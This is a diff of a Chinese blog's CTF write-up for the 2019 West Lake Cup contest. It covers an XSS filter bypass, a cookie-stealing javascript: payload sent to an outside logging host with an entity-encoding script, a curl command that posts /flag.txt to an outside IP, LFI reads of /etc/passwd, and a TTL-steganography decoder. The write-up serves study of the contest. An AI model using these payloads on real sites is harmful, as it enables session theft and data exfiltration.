@@ -127,9 +127,7 @@
 <p>略脑洞。。</p>
 <h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h1><p>题目环境关了有些无法截图</p>
 <p>随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\img\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</span><br></pre></td></tr></table></figure>
-
-<p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p>
+<pre><code>&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code></pre><p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p>
 <p>看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE</p>
 <p>但是测试用js uri加载外源js不能成功，打不到cookie。</p>
 <p>那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass</p>
@@ -137,13 +135,20 @@
 <p>url编码处理一下&amp;、#字符<br><img src="http://static.zybuluo.com/1160307775/amfts3uhddl0jr31udpj9qpa/image_1d7rloelagnr1aib1g56184q16cpba.png" alt="image_1d7rloelagnr1aib1g56184q16cpba.png-153kB"></p>
 <p>在平台打到cookie，发现存在admin字段<br><img src="http://static.zybuluo.com/1160307775/e3jfk48x3gtv1b2sv72x2rkh/image_1d7rlvepfab61co61oj45l6nctc4.png" alt="image_1d7rlvepfab61co61oj45l6nctc4.png-36.5kB"></p>
 <p>带着admin字段去exec.php执行命令就行了<br><img src="http://static.zybuluo.com/1160307775/ucowwhqx8njayw5q0mdhm8rm/image_1d7rm2jhs1ijc1t2898epplgch.png" alt="image_1d7rm2jhs1ijc1t2898epplgch.png-70.5kB"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl+&apos;http://50.16.48.95/&apos;+--data+&quot;`cat+/flag.txt`&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p>
+<pre><code>curl+&#39;http://50.16.48.95/&#39;+--data+&quot;`cat+/flag.txt`&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p>
 <p>编码转换的exp如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Author:Hpdoger@d0g3</span><br><span class="line"></span><br><span class="line">html_old = &quot;javascript:var website=&apos;http://xssye/index.php&apos;;(function()&#123;(new Image()).src=website+&apos;/?keepsession=1&amp;location=&apos;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;toplocation=&apos;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;cookie=&apos;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;opener=&apos;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)());&#125;)();&quot;</span><br><span class="line"></span><br><span class="line">buffer = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for zimu in html_old:</span><br><span class="line">    zimu = ord(zimu)</span><br><span class="line">    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)</span><br><span class="line">    # print(&quot;&amp;#&quot;+zimu)</span><br><span class="line">    buffer = buffer + zimu</span><br><span class="line">print(buffer)</span><br></pre></td></tr></table></figure>
+<pre><code># Author:Hpdoger@d0g3
 
-<h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p>
+html_old = &quot;javascript:var website=&#39;http://xssye/index.php&#39;;(function(){(new Image()).src=website+&#39;/?keepsession=1&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;
+
+buffer = &quot;&quot;
+
+for zimu in html_old:
+    zimu = ord(zimu)
+    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)
+    # print(&quot;&amp;#&quot;+zimu)
+    buffer = buffer + zimu
+print(buffer)</code></pre><h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p>
 <p>看到有个提示，base64解码之后是，dir.php<br><img src="http://static.zybuluo.com/1160307775/sn4yzp6jhu22951ixfda9wz9/image_1d7rmb67sieflmcrj41nmodcsdb.png" alt="image_1d7rmb67sieflmcrj41nmodcsdb.png-66.1kB"></p>
 <p>请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。<br><img src="http://static.zybuluo.com/1160307775/dqvga0mdv6ohks1ymtth4rbe/image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png" alt="image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png-212.3kB"></p>
 <p>看到根目录存在ffxxx的文件，直接用file去读<br><img src="http://static.zybuluo.com/1160307775/8qtcm0dqetiop2w9ccw2tr8k/image_1d7rmhg0ls1l3ptm8k29n614e5.png" alt="image_1d7rmhg0ls1l3ptm8k29n614e5.png-27.7kB"></p>
@@ -151,30 +156,53 @@
 <p>在网上找了一下，发现在MISC中有一项技术叫TTL隐写。</p>
 <p>大致的隐写流程如下：<br>将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。</p>
 <p>这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python3</span><br><span class="line"># Author: Hpdoger@d0g3</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line">change_list = []</span><br><span class="line">word_list = &apos;&apos;</span><br><span class="line">zimus = &apos;&apos;</span><br><span class="line"></span><br><span class="line">with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:</span><br><span class="line">    for ttl in file.readlines():</span><br><span class="line">        change_list.append(ttl.replace(&apos;TTL=&apos;,&apos;&apos;))</span><br><span class="line">        if len(change_list) == 4:</span><br><span class="line">            for num in change_list:</span><br><span class="line">                num = int(num)</span><br><span class="line">                a = bin(num).replace(&apos;0b&apos;,&apos;&apos;)</span><br><span class="line">                b = str(&quot;%08d&quot; % int(a))</span><br><span class="line">                infront = b[0:2]</span><br><span class="line">                word_list = word_list + infront</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            zimu = int(word_list,2)</span><br><span class="line">            zimus = zimus+chr(zimu)</span><br><span class="line">            word_list = &apos;&apos;</span><br><span class="line">            change_list.clear()</span><br><span class="line">            count = 0</span><br><span class="line"></span><br><span class="line">with open(&apos;results.txt&apos;,&apos;w&apos;) as file2:</span><br><span class="line">    file2.write(zimus)</span><br></pre></td></tr></table></figure>
+<pre><code>#! /usr/bin/python3
+# Author: Hpdoger@d0g3
 
-<p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p>
+count = 0
+change_list = []
+word_list = &#39;&#39;
+zimus = &#39;&#39;
+
+with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:
+    for ttl in file.readlines():
+        change_list.append(ttl.replace(&#39;TTL=&#39;,&#39;&#39;))
+        if len(change_list) == 4:
+            for num in change_list:
+                num = int(num)
+                a = bin(num).replace(&#39;0b&#39;,&#39;&#39;)
+                b = str(&quot;%08d&quot; % int(a))
+                infront = b[0:2]
+                word_list = word_list + infront
+
+
+            zimu = int(word_list,2)
+            zimus = zimus+chr(zimu)
+            word_list = &#39;&#39;
+            change_list.clear()
+            count = 0
+
+with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:
+    file2.write(zimus)</code></pre><p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p>
 <p>一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。</p>
 <p>拼接扫描得到:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:AutomaticKey cipher:fftu&#123;2028mb39927wn1f96o6e12z03j58002p&#125;</span><br></pre></td></tr></table></figure>
-
-<p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>
+<pre><code>key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}</code></pre><p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>
 
             </div>
           
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2019/04/08/西湖论剑2019-Writeup/">https://hpdoger.cn/2019/04/08/西湖论剑2019-Writeup/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -187,7 +215,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
